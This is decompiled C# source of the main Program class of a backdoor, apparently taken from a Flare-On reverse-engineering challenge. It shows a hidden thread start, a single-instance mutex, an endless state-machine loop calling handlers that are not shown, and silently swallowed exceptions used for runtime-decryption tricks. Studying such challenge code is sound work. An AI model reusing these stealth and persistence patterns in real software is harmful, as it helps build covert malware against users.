using System;
using System.Threading;

namespace FlareOn.Backdoor
{
	// Token: 0x0200001C RID: 28
	public class Program
	{
		// Token: 0x06000067 RID: 103 RVA: 0x000020E8 File Offset: 0x000090E8
		public Program()
		{
			new Thread(delegate()
			{
				Program.Main(Environment.GetCommandLineArgs());
			}).Start();
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00003F0C File Offset: 0x0000AF0C
		public static void flared_38(string[] args)
		{
			bool flag;
			using (new Mutex(true, "e94901cd-77d9-44ca-9e5a-125190bcf317", out flag))
			{
				bool flag2 = flag;
				if (flag2)
				{
					FLARE13 flare = new FLARE13();
					FLARE13.flare_48();
					FLARE03.flare_07();
					for (;;)
					{
						try
						{
							switch (FLARE13.cs)
							{
							case FLARE08.A:
								FLARE13.flare_50(FLARE07.A);
								break;
							case FLARE08.B:
								FLARE13.flare_50(Program.flare_72());
								break;
							case FLARE08.C:
								FLARE13.flare_50(FLARE05.flare_19());
								break;
							case FLARE08.D:
								FLARE13.flare_50(FLARE05.flare_20());
								break;
							case FLARE08.E:
								FLARE13.flare_50(FLARE14.flare_52());
								break;
							case FLARE08.F:
								FLARE13.flare_50(FLARE05.flare_21());
								break;
							case FLARE08.G:
								FLARE13.flare_50(FLARE05.flare_22());
								break;
							case FLARE08.H:
								FLARE13.flare_50(Program.flare_73());
								break;
							}
						}
						catch (Exception ex)
						{
							try
							{
							}
							catch
							{
							}
						}
						Thread.Sleep(1);
					}
				}
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00004038 File Offset: 0x0000B038
		public static void Main(string[] args)
		{
			try
			{
				try
				{
					FLARE15.flare_74();
					Program.flared_38(args);
				}
				catch (InvalidProgramException e)
				{
					FLARE15.flare_70(e, new object[]
					{
						args
					});
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00004094 File Offset: 0x0000B094
		public static FLARE07 flared_39()
		{
			FLARE15.flared_65(FLARE06.DT.C);
			return FLARE07.A;
		}

		// Token: 0x0600006B RID: 107 RVA: 0x000040B0 File Offset: 0x0000B0B0
		public static FLARE07 flare_72()
		{
			FLARE07 result;
			try
			{
				result = Program.flared_39();
			}
			catch (InvalidProgramException e)
			{
				result = (FLARE07)FLARE15.flare_70(e, null);
			}
			return result;
		}

		public static FLARE07 flared_40()
		{
			FLARE15.flare_65(FLARE06.DT.C);
			return FLARE07.A;
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00004108 File Offset: 0x0000B108
		public static FLARE07 flare_73()
		{
			FLARE07 result;
			try
			{
				result = Program.flared_40();
			}
			catch (InvalidProgramException e)
			{
				result = (FLARE07)FLARE15.flare_70(e, null);
			}
			return result;
		}
	}
}
